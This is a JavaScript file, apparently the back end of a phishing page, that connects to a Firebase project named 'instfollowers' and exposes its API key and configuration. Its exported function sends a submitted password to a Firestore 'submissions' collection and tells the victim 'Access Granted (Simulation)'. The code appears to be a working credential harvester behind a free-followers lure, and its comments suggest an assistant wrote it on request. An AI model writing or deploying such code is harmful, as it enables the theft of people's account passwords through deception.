
// Import Firebase functions from the CDN
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { 
    getFirestore, 
    collection, 
    addDoc,
    setDoc, // Adding setDoc just in case
    doc // Adding doc just in case
} from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-auth.js";


// ⚠️ STEP 1: Using the exact configuration you provided.
// WARNING: Sharing API keys publicly is not recommended for production applications.
const firebaseConfig = {
    apiKey: "AIzaSyBOAS7bZbOSw7liSKGYc5VUz46s2d23iHk",
    authDomain: "instfollowers-36e25.firebaseapp.com",
    projectId: "instfollowers-36e25",
    storageBucket: "instfollowers-36e25.firebasestorage.app",
    messagingSenderId: "239353140245",
    appId: "1:239353140245:web:891f52f24a4ded2fe02a1c"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);


// ----------------------------------------------------------------------
// 🔐 STEP 2: Handle Authentication (Required for Firestore access)
// ----------------------------------------------------------------------

// Sign in anonymously to ensure Firestore security rules are met
async function ensureAuth() {
    if (!auth.currentUser) {
        try {
            await signInAnonymously(auth);
            console.log("Signed in anonymously for Firestore access.");
        } catch (error) {
            console.error("Error signing in anonymously:", error);
            throw new Error("Authentication failed. Cannot access database.");
        }
    }
}


// ----------------------------------------------------------------------
// 💾 STEP 3: Write Data to Firestore
// ----------------------------------------------------------------------

// Function is now exported to be used by index.html
export async function saveToFirestore(password) {
    // 1. Ensure the user is authenticated first
    try {
        await ensureAuth();
    } catch (e) {
        return { success: false, message: e.message };
    }

    try {
        // Prepare the data object (using generic names for security)
        const formData = {
            // This is the correct way to get the password STRING value
            password_submission: password, 
            timestamp: new Date()
        };
        
        // Use addDoc to automatically generate a document ID 
        // and save the data to the 'submissions' collection
        const docRef = await addDoc(collection(db, "submissions"), formData);

        // Success feedback
        console.log("Password submission written with ID: ", docRef.id);
        return { success: true, message: "Success! Access Granted (Simulation). Data saved." };

    } catch (e) {
        // Error feedback
        console.error("Error adding document: ", e);
        return { success: false, message: `Database Error: ${e.message}` };
    }
}
